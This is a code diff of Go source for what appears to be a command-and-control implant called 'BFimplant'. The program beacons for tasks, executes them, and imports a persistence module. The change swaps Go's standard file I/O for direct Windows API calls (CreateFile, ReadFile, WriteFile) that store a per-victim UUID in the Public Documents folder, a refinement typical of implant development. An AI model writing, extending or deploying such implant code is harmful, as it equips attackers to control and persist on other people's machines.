@@ -1,8 +1,11 @@
 package main
 
-
 import (
+	"BFimplant/modules"
+	"BFimplant/per"
+	"BFimplant/winapiV2"
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -12,10 +15,9 @@ import (
 	"os/exec"
 	"runtime"
 	"time"
-	"BFimplant/modules"
+
 	"github.com/google/uuid"
-	"encoding/base64"
-	"BFimplant/per"
+	"syscall"
 )
 
 type plant struct {
@@ -129,10 +131,8 @@ func (i *plant) Beaconing() {
 			continue
 		}
 
-
 		for _, task := range tasks {
 			fmt.Println("Task:", task)
-
 			_, err := i.executeTask(task)
 			if err != nil {
 				fmt.Println("Error executing task:", err)
@@ -228,16 +228,36 @@ func Get_id() string {
 		filePath= "C:\\Users"+"\\Public\\Documents\\id.txt"
 	}
 
-	id, err := os.ReadFile(filePath)
-	if err == nil {
-		return string(id)
+	// open a file handel
+	fileHandle, err := winapiV2.CreateFile(syscall.StringToUTF16Ptr(filePath), winapiV2.GENERIC_READ|winapiV2.GENERIC_WRITE, 0, nil, winapiV2.OPEN_ALWAYS, winapiV2.FILE_ATTRIBUTE_NORMAL, 0)
+	if err != nil {
+		fmt.Println("Error creating a handel to the file:", err)
 	}
 
-	plantID := uuid.New().String()
-	if err := os.WriteFile(filePath, []byte(plantID), 0644); err != nil {
-		fmt.Println("Error writing plant ID to file:", err)
-	}
+	// read the file
+	fileSize, _ := winapiV2.GetFileSize(fileHandle, nil)
+
+	if fileSize == 0 {
+		plantID := uuid.New().String()
+		b := []byte(plantID)
+		var bwritten uint32
+		succ, err := winapiV2.WriteFile(fileHandle, &b[0], uint32(len(b)), &bwritten, nil)
+		if !succ {
+			fmt.Println("Error writing to file:", err)
+		}
 	return plantID
+
+	}else {
+		b := make([]byte, fileSize)
+		var bread uint32
+
+		succ, err := winapiV2.ReadFile(fileHandle, &b[0] ,uint32(len(b)), &bread, nil)
+		if !succ {
+			fmt.Println("Error reading file:", err )
+		}
+		plantID := string(b)
+		return plantID
+	}
 }
 
 func getHostname() string {
